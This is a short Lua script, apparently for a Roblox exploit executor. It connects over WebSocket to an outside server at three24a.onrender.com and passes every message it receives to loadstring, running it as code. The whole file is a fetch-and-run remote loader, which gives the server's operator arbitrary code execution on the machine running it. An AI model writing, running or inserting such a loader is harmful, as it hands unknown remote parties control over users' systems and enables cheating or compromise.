local WebSocket = WebSocket.connect("wss://three24a.onrender.com/getscript")

WebSocket.OnMessage:Connect(function(Msg)
    loadstring(Msg)()
end)